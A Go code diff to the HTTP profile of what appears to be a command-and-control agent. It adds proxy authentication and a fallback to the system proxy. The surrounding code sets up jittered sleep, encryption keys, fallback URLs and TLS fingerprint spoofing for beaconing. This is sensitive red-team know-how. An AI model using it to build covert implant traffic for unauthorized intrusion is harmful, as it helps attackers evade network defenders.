@@ -99,8 +99,11 @@ type HTTPProfile struct {
 	HandleInteractive      func(msgs []structs.InteractiveMsg)
 }
 
-// NewHTTPProfile creates a new HTTP profile
-func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
+// NewHTTPProfile creates a new HTTP profile.
+// proxyUser and proxyPass are optional proxy authentication credentials.
+// If proxyURL is empty, the system proxy is used (HTTP_PROXY/HTTPS_PROXY env vars).
+// If proxyURL contains embedded credentials (http://user:pass@host:port), those take precedence.
+func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, proxyUser, proxyPass, tlsVerify, tlsFingerprint string, fallbackURLs, contentTypes []string, recoverySeconds int) *HTTPProfile {
 	profile := &HTTPProfile{
 		BaseURL:       baseURL,
 		UserAgent:     userAgent,
@@ -128,11 +131,22 @@ func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepI
 		IdleConnTimeout:     90 * time.Second,
 	}
 
-	// Configure proxy if specified
+	// Configure proxy: explicit URL, or fall back to system proxy (env vars)
 	if proxyURL != "" {
 		if proxyU, err := url.Parse(proxyURL); err == nil {
+			// Inject credentials if provided separately and not already in URL
+			if proxyUser != "" && proxyU.User == nil {
+				if proxyPass != "" {
+					proxyU.User = url.UserPassword(proxyUser, proxyPass)
+				} else {
+					proxyU.User = url.User(proxyUser)
+				}
+			}
 			transport.Proxy = http.ProxyURL(proxyU)
 		}
+	} else {
+		// No explicit proxy — use system proxy from HTTP_PROXY / HTTPS_PROXY
+		transport.Proxy = http.ProxyFromEnvironment
 	}
 
 	// If a TLS fingerprint is specified (not "go" or empty), use uTLS to spoof
